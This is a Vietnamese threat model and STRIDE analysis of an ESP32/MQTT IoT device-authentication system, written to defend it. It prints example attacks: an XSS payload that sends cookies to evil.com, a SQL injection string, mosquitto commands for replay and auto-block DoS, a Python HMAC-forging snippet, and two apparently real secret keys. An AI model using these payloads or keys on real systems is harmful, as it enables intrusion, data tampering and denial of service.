# Threat Model & Phân tích Bảo mật Hệ thống IoT

Đề tài: Hệ thống quản lý thiết bị IoT — Xác thực danh tính và Kiểm soát truy cập

---

## 1. Tổng quan bề mặt tấn công

### 1.1 Kiến trúc và điểm tiếp xúc

```
[Sensor Node ESP32]
      │ MQTT plain TCP (LAN)
      │ topic: local/sensors/{sensor_id}/data
      ▼
[Gateway Node ESP32]
      │ HTTP (GET /api/device/sensors — lấy danh sách sensor mỗi 5 phút)
      │ MQTT plain TCP (LAN → Docker Mosquitto)
      │ topic: gateway/{gw_id}/data
      ▼
[Mosquitto Broker :1883]   ◄── bất kỳ ai trong LAN có thể publish
      │ subscribe gateway/+/data
      ▼
[Backend Express :5000]    ◄── qua Nginx :80, không expose trực tiếp
      │ pool.execute() MySQL
      ▼
[MySQL :3308]              ◄── chỉ trong Docker network
      ▲
[Frontend Next.js :3000]
      │ /api/[...path] proxy → Backend
      │ JWT HttpOnly cookie
      ▼
[Browser người dùng]
```

### 1.2 Các điểm vào của kẻ tấn công

| # | Entry Point | Protocol | Lớp | Ghi chú |
|---|---|---|---|---|
| E1 | MQTT topic `local/sensors/+/data` | MQTT 1883 | Nội bộ LAN | Sensor → Gateway |
| E2 | MQTT topic `gateway/+/data` | MQTT 1883 | LAN → Backend | Gateway → Broker |
| E3 | `GET /api/device/sensors` | HTTP | LAN → Backend | Gateway fetch sensor list |
| E4 | `POST /api/device/data` (HTTP fallback) | HTTP | Mạng → Backend | Backup route |
| E5 | `POST /api/auth/login` | HTTP/Nginx | Internet → Backend | Dashboard login |
| E6 | `/api/devices/*` `/api/users/*` | HTTP/Nginx | Internet → Backend | Admin API |
| E7 | Firmware binary (vật lý) | Vật lý | Thiết bị | Trích xuất key |
| E8 | Git repository | Source code | Hạ tầng | Config file lộ key |

---

## 2. Tác nhân đe dọa

| Tác nhân | Vị trí | Mục tiêu | Khả năng |
|---|---|---|---|
| **Attacker LAN** | Cùng mạng nội bộ | Giả mạo sensor, inject dữ liệu giả | Nghe lén MQTT, publish bất kỳ topic |
| **Attacker bên ngoài** | Internet | Chiếm tài khoản dashboard, đọc/xóa thiết bị | HTTP đến Nginx port 80 |
| **Insider threat** | Người có tài khoản viewer/operator | Leo thang quyền, đánh cắp key | JWT hợp lệ, biết nội bộ |
| **Attacker vật lý** | Tiếp cận thiết bị ESP32 | Trích xuất firmware, lấy secret_key | Flash dump, JTAG, UART |
| **Attacker supply chain** | Truy cập git repo | Lấy credentials trong config.h | `config.h`, `config_gw.h` có key thật |

---

## 3. Cơ chế xác thực `device_id + HMAC` — Hoạt động chi tiết

### 3.1 Luồng đầy đủ từ firmware đến database

```
BƯỚC 1 — Sensor Node tạo HMAC (firmware/sensor-node/lib/hmac_util/hmac_util.cpp):
    message = "ESP32-SN-CBF05770:1718600000"   ← device_id:unix_timestamp (NTP)
    sn_hmac = HMAC-SHA256(SECRET_KEY, message)  ← 32 bytes → encode hex 64 ký tự
    gửi JSON qua MQTT: { sensor_id, sn_timestamp, sn_hmac, data: { temp, humid } }

BƯỚC 2 — Gateway Node xác thực sensor (firmware/gateway-node/lib/forwarder/forwarder.cpp):
    a. Tra cứu secret_key từ dynamic registry (fetchSensorList()) hoặc KNOWN_SENSORS[]
    b. Kiểm tra |now - sn_timestamp| ≤ 300 giây               ← chống replay
    c. Tính lại HMAC, so sánh bằng safeEq64() constant-time   ← chống timing attack
    d. Nếu OK → tạo gw_hmac: HMAC-SHA256(GW_SECRET_KEY, "gw_id:gw_timestamp")
    e. Publish MQTT: { gateway_id, gw_timestamp, gw_hmac, sensor_payload: { sensor_id, sn_timestamp, sn_hmac, data } }

BƯỚC 3 — Backend xác thực 2 lớp (backend/src/services/mqttDataService.ts + hmacService.ts):
    Level 1 (Gateway):
        device = SELECT * FROM devices WHERE device_id = gateway_id
        kiểm tra: device.status == 'active', device.device_type == 'gateway'
        kiểm tra: |now - gw_timestamp| ≤ 300 giây
        expected = HMAC-SHA256(device.secret_key, "gateway_id:gw_timestamp")
        so sánh: crypto.timingSafeEqual(expected, gw_hmac)
    Level 2 (Sensor):
        device = SELECT * FROM devices WHERE device_id = sensor_id
        kiểm tra: device.status == 'active', device.device_type == 'sensor'
        kiểm tra: |now - sn_timestamp| ≤ 300 giây
        expected = HMAC-SHA256(device.secret_key, "sensor_id:sn_timestamp")
        so sánh: crypto.timingSafeEqual(expected, sn_hmac)
    Level 3 (Device type guard):
        kiểm tra: gateway_id thật sự là device_type='gateway' trong DB
        kiểm tra: sensor_id thật sự là device_type='sensor' trong DB

BƯỚC 4 — Lưu trữ và audit:
    INSERT INTO sensor_data (device_id, gateway_id, payload) VALUES (...)
    UPDATE devices SET last_seen = NOW(), fail_count = 0 WHERE id = ...
    INSERT INTO audit_log (event_type='DATA_RECV', ...)
```

### 3.2 Vai trò của từng trường trong xác thực

| Trường | Nguồn | Mục đích | Nếu thiếu |
|---|---|---|---|
| `device_id` | Firmware config | Định danh thiết bị, lookup DB | Từ chối `MISSING_FIELDS` |
| `secret_key` | DB (không gửi đi) | Tham số HMAC — không xuất hiện trên wire | — |
| `sn_hmac` / `gw_hmac` | Firmware tính | Bằng chứng thiết bị biết `secret_key` | Từ chối `MISSING_FIELDS` |
| `sn_timestamp` / `gw_timestamp` | NTP (firmware) | Chống replay — cửa sổ ±300 giây | `TIMESTAMP_EXPIRED` |
| `status` | DB | Chặn thiết bị `inactive` / `blocked` | Từ chối `DEVICE_INACTIVE` |
| `device_type` | DB | Chặn sensor đóng giả gateway và ngược lại | Từ chối (drop) |

### 3.3 Tại sao không gửi `secret_key` trực tiếp?

Nếu gửi `secret_key` dạng plain text trong request:

```
POST /api/device/data
{ "device_id": "ESP32-SN-xxx", "secret_key": "c07f902...", "data": {...} }
```

- Bất kỳ người nào nghe lén MQTT/HTTP một lần là lấy được `secret_key` vĩnh viễn.
- Attacker replay toàn bộ request cũ không cần biết key.

Với HMAC:

```
{ "sensor_id": "ESP32-SN-xxx", "sn_timestamp": 1718600000, "sn_hmac": "a3f7...", "data": {...} }
```

- `secret_key` không bao giờ xuất hiện trên đường truyền.
- Mỗi lần gửi có `timestamp` khác nhau → `sn_hmac` khác nhau → không thể tái sử dụng request cũ (replay attack).
- Attacker nghe lén được request nhưng không thể tách ngược `secret_key` từ HMAC.

---

## 4. Phân tích tấn công theo STRIDE

### S — Spoofing (Giả mạo danh tính)

#### S1. Giả mạo Sensor Node

**Mục tiêu**: Attacker tạo thiết bị giả gửi dữ liệu cảm biến sai (nhiệt độ, độ ẩm giả).

**Cách tấn công**:
1. Attacker kết nối vào cùng mạng LAN, publish MQTT topic `local/sensors/ESP32-SN-xxx/data`.
2. Gửi JSON với `sensor_id` hợp lệ nhưng `sn_hmac` sai hoặc tự bịa.

**Cơ chế phòng thủ**:
- Gateway xác thực `sn_hmac` bằng `safeEq64()` trước khi forward.
- Backend xác thực lại `sn_hmac` bằng `crypto.timingSafeEqual()` — hai lần kiểm tra độc lập.
- Nếu `sn_hmac` sai 5 lần → sensor bị `blocked` tự động (`BLOCK_THRESHOLD = 5`).

**Kết quả**: Tấn công thất bại nếu không có `secret_key` hợp lệ của sensor.

**Điểm yếu còn lại**: Nếu attacker lấy được `secret_key` từ firmware hoặc git repo, attacker tạo được HMAC hợp lệ.

---

#### S2. Giả mạo Gateway Node

**Mục tiêu**: Attacker publish trực tiếp lên MQTT topic `gateway/ESP32-GW-xxx/data` mà không qua firmware gateway thật.

**Cách tấn công**:
1. Attacker kết nối MQTT broker port 1883 (không cần authentication vì Mosquitto chưa cấu hình user/password).
2. Publish payload với `gateway_id` hợp lệ nhưng `gw_hmac` giả.

**Cơ chế phòng thủ**:
- Backend verify `gw_hmac` bằng `crypto.timingSafeEqual()`.
- Gateway bị block sau 5 lần sai.
- Audit log ghi `GATEWAY_AUTH_FAIL`.

**Điểm yếu nghiêm trọng**: **Mosquitto broker port 1883 không có authentication** — bất kỳ ai trong LAN đều kết nối được và publish/subscribe bất kỳ topic nào. Attacker có thể:
- Subscribe `gateway/+/data` để nghe toàn bộ payload (bao gồm `sn_hmac` và `gw_hmac` của request hợp lệ).
- Cố gắng brute force `gw_hmac` (256-bit → không khả thi, nhưng replay trong 300 giây là có thể).

---

#### S3. Giả mạo người dùng dashboard

**Mục tiêu**: Chiếm tài khoản admin/operator để đăng ký thiết bị giả, thay đổi trạng thái, xóa thiết bị.

**Cách tấn công — Brute force login**:
```
POST /api/auth/login
{ "username": "admin", "password": "brute_force_attempt" }
```

**Cơ chế phòng thủ**:
- `authLimiter`: tối đa 10 request trong 15 phút mỗi IP.
- bcrypt saltRounds=12 — mỗi lần hash tốn ~250ms.
- Dummy hash khi username không tồn tại → chống timing-based user enumeration.

**Điểm yếu**: Rate limit theo IP → attacker dùng nhiều IP vẫn brute force được. Không có 2FA, không có CAPTCHA.

---

### T — Tampering (Giả mạo/Sửa dữ liệu)

#### T1. Sửa dữ liệu cảm biến trên đường truyền MQTT

**Mục tiêu**: Attacker intercept MQTT message và thay đổi `data.temperature` trước khi gateway nhận.

**Cách tấn công**: Man-in-the-middle trên mạng LAN, modify payload JSON rồi forward.

**Kết quả**: `sn_hmac` trong payload đã được sensor tính trên data gốc. Nếu attacker thay `temperature=25` thành `temperature=999`, `sn_hmac` không còn hợp lệ nữa. Backend sẽ reject với `HMAC_MISMATCH`.

**Đánh giá**: HMAC bảo vệ tính toàn vẹn dữ liệu hiệu quả, miễn là attacker không có `secret_key`.

---

#### T2. Tấn công SQL Injection

**Mục tiêu**: Inject câu lệnh SQL qua input của API để đọc/xóa/sửa database.

**Cách tấn công**:
```
POST /api/auth/login
{ "username": "admin' OR '1'='1", "password": "anything" }
```

**Cơ chế phòng thủ**: Toàn bộ backend dùng prepared statements với `pool.execute(sql, [params])` — MySQL driver tách biệt SQL và data. Input được sanitize thêm bằng `.trim().slice(0, maxLength)` trước khi truyền vào query.

**Đánh giá**: SQL injection không khả thi với codebase hiện tại.

---

#### T3. Tấn công XSS trên Dashboard

**Mục tiêu**: Inject script độc hại qua tên thiết bị (`device_name`, `location`) để chạy trên browser admin.

**Cách tấn công**: Đăng ký thiết bị với `device_name = "<script>fetch('evil.com/'+document.cookie)</script>"`.

**Cơ chế phòng thủ**:
- Helmet đặt `Content-Security-Policy` và `X-Content-Type-Options`.
- JWT dùng HttpOnly cookie → JavaScript không đọc được cookie dù XSS chạy thành công.
- Next.js escapes HTML mặc định khi render.

**Điểm yếu**: `sanitize()` trong backend chỉ `.trim().slice(0, maxLength)` — không strip HTML tags. Rủi ro phụ thuộc vào cách frontend render.

---

### R — Repudiation (Phủ nhận hành động)

#### R1. Người dùng phủ nhận thao tác quản trị

**Kịch bản**: Operator xóa nhầm thiết bị và phủ nhận.

**Cơ chế đối phó**: Audit log ghi đầy đủ `event_type`, `device_id`, `ip_address`, `user_agent`, `details.deleted_by`, `details.deleted_device_id`, `created_at`. Mỗi thao tác `DEVICE_REGISTER`, `DEVICE_STATUS_CHANGE`, `DEVICE_DELETE` đều có dấu vết với thông tin người thực hiện.

**Điểm yếu**: Audit log lưu trong cùng database — admin có thể truy cập trực tiếp MySQL và xóa audit_log. Không có cơ chế write-only/append-only log.

---

#### R2. Thiết bị phủ nhận đã gửi dữ liệu

**Kịch bản**: Claim rằng dữ liệu nhiệt độ cao bất thường là giả mạo, không phải do thiết bị gửi.

**Cơ chế đối phó**: Audit log `DATA_RECV` ghi `sensor_id`, `gateway_id`, `data_id`. Dữ liệu chỉ vào được database khi HMAC hợp lệ. Tuy nhiên không có **digital signature** (chỉ ký tắt, không có non-repudiation đầy đủ theo nghĩa PKI) — về lý thuyết, backend biết `secret_key` nên cũng có thể tự tạo ra payload hợp lệ.

---

### I — Information Disclosure (Lộ thông tin)

#### I1. Nghe lén MQTT (Sniffing)

**Mục tiêu**: Attacker nghe lén MQTT để thu thập dữ liệu cảm biến, `device_id`, `sn_hmac`, `gw_hmac`.

**Thực hiện**: Kết nối MQTT broker, subscribe `#` (wildcard tất cả topics) hoặc cụ thể `gateway/+/data`.

**Thông tin lộ ra**:
- `sensor_id`, `gateway_id` — định danh thiết bị
- `sn_timestamp`, `gw_timestamp` — thời gian gửi
- `sn_hmac`, `gw_hmac` — HMAC của request này (dùng lại trong 300 giây)
- `sensor_ip`, `gateway_ip` — địa chỉ IP nội bộ
- `data.temperature`, `data.humidity` — dữ liệu cảm biến

**Thông tin KHÔNG lộ ra**: `secret_key` — không xuất hiện trên wire.

**Điểm yếu**: Mosquitto không có TLS, không có authentication — bất kỳ ai kết nối LAN đều subscribe được.

---

#### I2. Lộ `secret_key` qua Git repository

**Tình trạng hiện tại**: File `firmware/sensor-node/include/config.h` và `firmware/gateway-node/include/config_gw.h` chứa `SECRET_KEY`, `GW_SECRET_KEY`, `WIFI_PASS`, IP address thật và **đang được Git track**:

```c
// firmware/sensor-node/include/config.h (line 10)
#define SECRET_KEY  "c07f902691c6f148aa3d4247f04bd6f19ee7724f1cad4581667c5844d1d82b3e"

// firmware/gateway-node/include/config_gw.h (line 11)
#define GW_SECRET_KEY  "d46abb32f2fa488f35e07377cf0d147caf7cff8e2c042bb8b27bd2cca83b70e9"
```

**Rủi ro**: Nếu repo được push lên GitHub/GitLab (public hoặc bị leak), toàn bộ credentials bị lộ.

---

#### I3. Lộ `secret_key` qua flash dump vật lý

**Thực hiện**: Kết nối UART/JTAG vào ESP32, dùng `esptool.py flash_id` và `read_flash` để dump toàn bộ flash memory. `secret_key` lưu plain text trong binary.

**Điểm yếu**: ESP32 không bật **Secure Boot** và **Flash Encryption** trong project này.

---

#### I4. Lộ thông tin qua error message

**Thực hiện**: Gửi request sai format để kích hoạt error response.

**Thông tin trả về**: `{ error: "GATEWAY_AUTH_FAIL", reason: "NOT_FOUND" }` — xác nhận gateway_id đó không tồn tại, có thể dùng để enumerate device_id. Tương tự `TIMESTAMP_EXPIRED` tiết lộ device tồn tại nhưng timestamp sai.

---

### D — Denial of Service (Từ chối dịch vụ)

#### D1. Brute force HMAC → Auto-block thiết bị thật

**Mục tiêu**: Kẻ tấn công cố tình gửi `HMAC` sai cho sensor/gateway hợp lệ để trigger auto-block sau 5 lần, làm thiết bị thật không gửi được dữ liệu.

**Thực hiện**:
```bash
# Publish 5 message với gw_hmac sai
mosquitto_pub -h 192.168.100.139 -t "gateway/ESP32-GW-78867B14/data" \
  -m '{"gateway_id":"ESP32-GW-78867B14","gw_timestamp":1718600000,"gw_hmac":"wronghmac..."}'
```

**Kết quả**: Sau 5 lần fail → `status = 'blocked'`, gateway thật không gửi dữ liệu được nữa dù HMAC đúng.

**Điểm yếu nghiêm trọng**: Mosquitto không có authentication → attacker trong LAN thực hiện được mà không cần biết `secret_key`. Đây là **DoS vector thực tế** nếu attacker vào được mạng LAN.

**Cơ chế phòng thủ**: Audit log ghi `GATEWAY_AUTH_FAIL` với IP — admin có thể phát hiện và mở khóa thủ công.

---

#### D2. MQTT Flood

**Mục tiêu**: Gửi số lượng lớn message MQTT để làm backend quá tải.

**Thực hiện**: Publish liên tục lên `gateway/+/data`. Backend xử lý mỗi message bất đồng bộ (`handleGatewayData`) kèm nhiều database query.

**Cơ chế phòng thủ hiện tại**: `deviceDataLimiter` (60 req/min) chỉ áp dụng cho HTTP `/api/device/data` — **không áp dụng cho luồng MQTT**. Mosquitto nhận message từ bất kỳ MQTT client nào mà không giới hạn.

**Điểm yếu**: Không có rate limit cho MQTT → flood qua MQTT không bị chặn.

---

#### D3. HTTP API Flood

**Mục tiêu**: Làm backend quá tải qua HTTP.

**Cơ chế phòng thủ**:
- `authLimiter`: 10 req/15min cho `/api/auth/login`.
- `deviceDataLimiter`: 60 req/min cho `/api/device/data`.
- `apiLimiter`: 100 req/15min cho tất cả `/api/*` còn lại.
- Body size limit: 10KB (chống large payload attack).

**Điểm yếu**: Rate limit theo IP → attacker dùng nhiều IP (botnet) có thể bypass.

---

### E — Elevation of Privilege (Leo thang quyền)

#### E1. Viewer leo thang lên Admin

**Mục tiêu**: Tài khoản `viewer` thực hiện thao tác của `admin`.

**Thực hiện**: Gửi request trực tiếp đến API admin mà không qua UI:
```
PATCH /api/devices/1/status   → chỉ admin/operator
DELETE /api/devices/1         → chỉ admin
POST /api/users               → chỉ admin
```

**Cơ chế phòng thủ**: Middleware `requireRole("admin")` hoặc `requireRole("admin", "operator")` trả về `403 FORBIDDEN` nếu role không khớp. Role được lấy từ JWT payload không thể giả mạo nếu không biết `JWT_SECRET`.

**Điểm yếu**: JWT không thể revoke ngay lập tức — nếu tài khoản bị chiếm, JWT cũ vẫn hợp lệ cho đến khi hết hạn 8 giờ. Không có cơ chế blacklist JWT.

---

#### E2. Sensor đóng giả Gateway

**Mục tiêu**: Sensor gửi trực tiếp lên topic `gateway/+/data` để bypass kiểm tra tại gateway, mượn quyền forward của gateway.

**Thực hiện**: Firmware sensor được sửa để publish lên `gateway/ESP32-GW-xxx/data` thay vì `local/sensors/`.

**Cơ chế phòng thủ**: Backend kiểm tra `device_type` từ database sau khi HMAC pass:

```typescript
// mqttDataService.ts dòng 87-94
if (!gwRow || gwRow.device_type !== "gateway") { ... return; }
if (!snRow || snRow.device_type !== "sensor")  { ... return; }
```

Sensor không thể đóng giả gateway vì `device_type` trong DB là `sensor`.

---

## 5. Điểm yếu khi `secret_key` bị lộ

### 5.1 Attacker lấy được `secret_key` của sensor

**Nguồn có thể bị lộ**:
- File `firmware/sensor-node/include/config.h` trong git repo
- Flash dump vật lý từ board ESP32
- Database bị breach (secret_key lưu plain text)
- `GET /api/device/sensors` response (trả về cả secret_key cho gateway)

**Những gì attacker làm được ngay lập tức**:

```python
import hmac, hashlib, time, json

sensor_id  = "ESP32-SN-CBF05770"
secret_key = "c07f902691c6f148aa3d4247f04bd6f19ee7724f1cad4581667c5844d1d82b3e"

timestamp = int(time.time())
message   = f"{sensor_id}:{timestamp}".encode()
sn_hmac   = hmac.new(secret_key.encode(), message, hashlib.sha256).hexdigest()

# Bây giờ có thể gửi dữ liệu giả hợp lệ
payload = {
    "sensor_id":    sensor_id,
    "sn_timestamp": timestamp,
    "sn_hmac":      sn_hmac,
    "data":         {"temperature": 999, "humidity": 0}
}
```

**Attacker KHÔNG làm được** (ngay cả khi biết sensor secret):
- Không thể bypass xác thực gateway nếu không có gateway secret_key.
- Không thể truy cập dashboard nếu không có tài khoản user.
- Không thể thay đổi trạng thái thiết bị, thêm thiết bị mới, xem audit log.

**Hệ quả với hệ thống**:
- Dữ liệu cảm biến bị ô nhiễm — dashboard hiển thị giá trị giả.
- Không có cách tự động phát hiện dữ liệu từ thiết bị thật hay attacker vì cả hai đều có HMAC hợp lệ.
- `fail_count` không tăng vì HMAC đúng.

### 5.2 Attacker lấy được `secret_key` của gateway

**Những gì attacker làm được**:
1. **Publish trực tiếp lên `gateway/+/data`** với HMAC hợp lệ — bypass gateway firmware hoàn toàn.
2. **Kéo danh sách sensor** qua `GET /api/device/sensors?gateway_id=...&gw_timestamp=...&gw_hmac=...` — nhận về `device_id` và `secret_key` của tất cả sensor active.
3. **Giả mạo toàn bộ hệ thống sensor-gateway** nếu lấy thêm được sensor secrets từ bước 2.

**Đây là điểm nguy hiểm nhất**: Gateway secret_key = chìa khóa để lấy secret của tất cả sensor khác.

### 5.3 Attacker lấy được `secret_key` của cả sensor lẫn gateway

**Có thể giả mạo hoàn toàn** một cặp sensor-gateway, inject dữ liệu tùy ý vào database với HMAC hợp lệ ở cả 2 lớp. Backend không phân biệt được.

### 5.4 Không có cơ chế rotate/revoke key

**Vấn đề nghiêm trọng nhất**: Khi `secret_key` bị lộ, hệ thống **không có endpoint nào để đổi `secret_key`**. Giải pháp tạm thời:
1. Admin/Operator block thiết bị qua dashboard.
2. Xóa thiết bị cũ, đăng ký lại thiết bị mới.
3. Nhận `secret_key` mới, nạp lại firmware.

Quy trình này thủ công và không có rollout tự động.

---

## 6. Bảng tổng hợp STRIDE

| ID | Loại | Tấn công | Cơ chế phòng thủ hiện tại | Mức độ rủi ro | Hạn chế còn lại |
|---|---|---|---|---|---|
| S1 | Spoofing | Giả mạo sensor (HMAC sai) | Gateway + Backend verify HMAC, auto-block | **Thấp** | Cần secret_key |
| S2 | Spoofing | Kết nối MQTT trực tiếp (bypass gateway) | Backend verify gw_hmac + device_type | **Thấp** (khi không có key) | MQTT không có auth |
| S3 | Spoofing | Brute force login dashboard | authLimiter, bcrypt, anti-enum | **Trung bình** | Rate limit theo IP |
| T1 | Tampering | Sửa data MQTT in-transit | HMAC bảo vệ toàn vẹn | **Thấp** | Cần secret_key để bypass |
| T2 | Tampering | SQL Injection | Prepared statements | **Rất thấp** | Đã phòng thủ tốt |
| T3 | Tampering | XSS qua device_name | Helmet, HttpOnly cookie | **Trung bình** | Không strip HTML tags |
| R1 | Repudiation | Phủ nhận thao tác admin | Audit log với user, IP, timestamp | **Trung bình** | Admin có thể xóa audit log |
| I1 | Info Disclosure | Sniff MQTT (device_id, HMAC, data) | — | **Cao** | Không có MQTT TLS |
| I2 | Info Disclosure | secret_key lộ qua Git | — | **Rất cao** | Config.h có key thật trong Git |
| I3 | Info Disclosure | Flash dump ESP32 | — | **Cao** | Không có Secure Boot/Flash Encryption |
| I4 | Info Disclosure | Enumerate device_id qua error msg | — | **Thấp** | Error msg tiết lộ tồn tại/không |
| D1 | DoS | Auto-block thiết bị thật (5 lần sai) | Audit log, unblock thủ công | **Cao** | MQTT không có auth → dễ thực hiện |
| D2 | DoS | MQTT flood | — | **Cao** | Không có rate limit cho MQTT |
| D3 | DoS | HTTP API flood | Rate limit theo IP | **Trung bình** | IP-based → bypass bằng multi-IP |
| E1 | Privilege Esc. | Viewer đọc API admin | requireRole middleware | **Thấp** | JWT không revocable ngay |
| E2 | Privilege Esc. | Sensor giả mạo gateway | device_type check sau HMAC | **Thấp** | Đã phòng thủ tốt |

---

## 7. Cơ chế phòng thủ đã triển khai — Đánh giá

### 7.1 Lớp Firmware (ESP32)

| Cơ chế | File | Mô tả |
|---|---|---|
| HMAC-SHA256 | `hmac_util.cpp` | Dùng mbedTLS, không expose secret_key trên wire |
| Constant-time compare | `forwarder.cpp:safeEq64()` | XOR loop 64 iteration — chống timing attack |
| Timestamp window ±300s | `forwarder.cpp` | Chống replay trước khi forward |
| NTP guard | `ntp_sync.cpp` | Từ chối gửi nếu NTP chưa sync |
| Dynamic sensor registry | `sensor_registry.cpp` | Fetch mỗi 5 phút, lazy refresh |
| Buffer overflow protection | `mqtt_client.cpp` | `copyLen = min(length, sizeof(buf)-1)` |

### 7.2 Lớp Backend (Express + Node.js)

| Cơ chế | File | Mô tả |
|---|---|---|
| HMAC 2 lớp độc lập | `hmacService.ts` | Verify gateway và sensor riêng biệt |
| Constant-time compare | `hmacService.ts:safeCompare()` | `crypto.timingSafeEqual()` |
| Timestamp window ±300s | `hmacService.ts` | Kiểm tra tại backend, độc lập với gateway |
| Auto-block (fail_count=5) | `mqttDataService.ts`, `validateDevice.ts` | Block cả luồng MQTT và HTTP |
| Audit log đầy đủ | `auditLogger.ts` | 7 event types, ghi async |
| Helmet headers | `app.ts` | XSS, clickjack, MIME protection |
| CORS restricted | `app.ts` | Chỉ cho phép origin frontend |
| Rate limiting | `app.ts` | 3 tier: login, device data, API |
| Body size limit | `app.ts` | 10KB giới hạn request body |
| Prepared statements | Tất cả routes | Chống SQL injection |
| JWT HttpOnly cookie | `auth.ts` | SameSite=Strict, 8 giờ |
| bcrypt saltRounds=12 | `auth.ts` | Hash password mạnh |
| Anti-enumeration | `auth.ts` | Dummy hash khi user không tồn tại |
| Device type guard | `mqttDataService.ts` | Không cho sensor đóng giả gateway |

### 7.3 Lớp Database

| Cơ chế | File | Mô tả |
|---|---|---|
| ENUM constraints | `001_schema.sql` | `status`, `device_type`, `role` chỉ nhận giá trị hợp lệ |
| Foreign key cascade | `001_schema.sql` | Xóa thiết bị tự xóa sensor_data |
| Index trên status | `001_schema.sql` | `idx_devices_status` — query nhanh |
| Data retention | `mqttDataService.ts` | Giữ tối đa 150 records/sensor |

---

## 8. Hạn chế và Khuyến nghị

### 8.1 Hạn chế theo thứ tự ưu tiên

**[CRITICAL] Không có authentication cho Mosquitto MQTT Broker**
- Bất kỳ ai trong LAN đều subscribe được `gateway/+/data` và publish message
- Dẫn đến: sniffing toàn bộ payload, DoS bằng auto-block, relay attack trong 300 giây
- Khuyến nghị: Bật password authentication trong `mosquitto.conf`, giới hạn ACL theo client-id

**[CRITICAL] secret_key lưu plain text trong database**
- Cần plain text để tính HMAC, nhưng nếu DB bị breach toàn bộ key bị lộ
- Khuyến nghị: Mã hóa cột `secret_key` at-rest bằng MySQL encryption hoặc application-level encryption với KMS

**[CRITICAL] Credentials trong file config bị Git track**
- `config.h` và `config_gw.h` có key thật đang trong working tree
- Khuyến nghị: Thêm `*.local.h`, `config_secret.h` vào `.gitignore`, dùng environment variable hoặc provisioning script

**[HIGH] Không có MQTT TLS**
- Dữ liệu cảm biến và HMAC truyền plain text trong LAN
- Khuyến nghị: Cấu hình Mosquitto port 8883 với TLS, firmware dùng `WiFiClientSecure`

**[HIGH] Không có key rotation/revoke**
- Khi key bị lộ, phải xóa thiết bị và đăng ký lại thủ công
- Khuyến nghị: Thêm API `POST /api/devices/:id/rotate-key` (admin only) sinh key mới và trả về một lần

**[HIGH] Auto-block DoS vulnerability**
- Attacker trong LAN publish 5 message với HMAC sai → block thiết bị thật
- Khuyến nghị: Rate limit MQTT per client-id, hoặc chỉ tăng `fail_count` nếu request đến từ IP khác với `last_ip` đã biết

**[MEDIUM] Không có nonce — replay trong 300 giây**
- Request hợp lệ có thể bị replay trong vòng 5 phút
- Khuyến nghị: Lưu `(device_id, timestamp)` đã dùng trong Redis với TTL 600s, từ chối timestamp trùng lặp

**[MEDIUM] JWT không có revocation list**
- Tài khoản bị chiếm phải đợi 8 giờ JWT hết hạn
- Khuyến nghị: Token version trong JWT payload — mỗi lần logout/change password tăng `token_version` trong DB; middleware kiểm tra version

**[MEDIUM] HTTP thay vì HTTPS cho sensor list**
- `GET /api/device/sensors` truyền `secret_key` của tất cả sensor qua HTTP không mã hóa
- Khuyến nghị: Bắt buộc HTTPS (cấu hình SSL trên Nginx), chặn HTTP

**[LOW] Error message tiết lộ device_id tồn tại/không**
- `reason: "NOT_FOUND"` vs `reason: "HMAC_MISMATCH"` khác nhau → enumerate
- Khuyến nghị: Trả về generic `AUTH_FAILED` thay vì lý do cụ thể

---

## 9. Kịch bản tấn công hoàn chỉnh — Demo cho phản biện

### Kịch bản: Attacker trong mạng LAN, không có secret_key

```
[Attacker] → kết nối WiFi cùng LAN
    ↓
1. Subscribe MQTT: mosquitto_sub -h 192.168.100.139 -t "gateway/+/data"
    → Nhận được: { gateway_id, gw_timestamp, gw_hmac, sensor_payload: {...} }
    → Lưu lại gw_hmac hợp lệ kèm gw_timestamp
    
2. Trong vòng 300 giây kể từ khi nhận:
   mosquitto_pub -h 192.168.100.139 -t "gateway/ESP32-GW-78867B14/data"
   -m '{ "gateway_id": "ESP32-GW-78867B14",
          "gw_timestamp": <timestamp cũ>,
          "gw_hmac": "<hmac cũ copy>",
          "sensor_payload": { "sensor_id": "ESP32-SN-CBF05770",
                              "sn_timestamp": <cũ>, "sn_hmac": "<cũ>",
                              "data": { "temperature": 999 } } }'

3. Kết quả thực tế:
   - Backend nhận request, verify HMAC → HMAC đúng (vì copy từ request thật)
   - Timestamp: nếu trong 300 giây → PASS, nếu quá → TIMESTAMP_EXPIRED
   → Replay trong 300s có thể thành công
   → Sau 300s hoàn toàn bị block
```

### Kịch bản: Attacker có gateway secret_key (ví dụ từ Git leak)

```
[Attacker] → biết GW_SECRET_KEY từ config_gw.h trong Git
    ↓
1. Tính gw_hmac mới với timestamp hiện tại (không bị replay limit)
2. Gọi GET /api/device/sensors?gateway_id=...&gw_timestamp=now&gw_hmac=...
   → Nhận về danh sách TẤT CẢ sensor kèm secret_key của từng sensor!
3. Dùng sensor secret_key để inject dữ liệu giả hợp lệ cho bất kỳ sensor nào
4. Dashboard hiển thị dữ liệu attacker inject mà không có alert nào
```

### Kịch bản: DoS bằng auto-block (Attacker LAN, không cần key)

```
[Attacker] → biết gateway_id (dễ tìm qua MQTT sniffing)
    ↓
for i in range(5):
    mosquitto_pub -h 192.168.100.139 -t "gateway/ESP32-GW-78867B14/data"
    -m '{"gateway_id":"ESP32-GW-78867B14","gw_timestamp":1718600000,"gw_hmac":"aaaa...fake"}'

→ Backend: GATEWAY_AUTH_FAIL ×5 → UPDATE status='blocked'
→ Gateway thật: gửi dữ liệu hợp lệ nhưng nhận 401 DEVICE_BLOCKED
→ Hệ thống ngừng nhận dữ liệu cho đến khi admin unblock thủ công
```

---

## 10. Kết luận

Hệ thống đã triển khai một kiến trúc bảo mật đúng hướng với HMAC hai lớp, constant-time comparison, timestamp replay protection và RBAC đầy đủ. Các tấn công từ internet bị ngăn chặn tốt.

**Điểm yếu cốt lõi nằm ở lớp truyền thông nội bộ**: MQTT plain TCP không có authentication là bề mặt tấn công lớn nhất — cho phép sniffing, replay attack và DoS auto-block từ bất kỳ thiết bị nào trong mạng LAN. Ngoài ra việc lưu `secret_key` plain text trong database và trong file config Git-tracked tạo ra rủi ro nghiêm trọng nếu có breach.

Với phạm vi là hệ thống IoT nội bộ phòng lab/demo, mức bảo mật hiện tại là chấp nhận được. Để triển khai thực tế cần ưu tiên: MQTT TLS + authentication, HTTPS bắt buộc và quản lý key an toàn.
